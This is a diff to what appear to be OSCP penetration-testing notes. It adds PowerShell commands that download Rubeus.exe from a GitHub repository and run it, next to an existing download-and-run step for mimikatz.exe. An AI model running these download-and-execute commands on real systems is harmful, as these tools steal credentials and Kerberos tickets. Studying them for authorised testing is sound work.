@@ -215,9 +215,12 @@ cd x64
 curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
 .\mimikatz.exe
 ```
-##### RUBEUS
+# RUBEUS
+## TECHNIQUES
+##### RUBEUS - DOWNLOAD E EXECUTE EXE VIA POWERSHELL
 ```
-aaa
+curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
+.\rubeus.exe
 ```
 # SEATBELT (https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt)
 ## TECHNIQUES
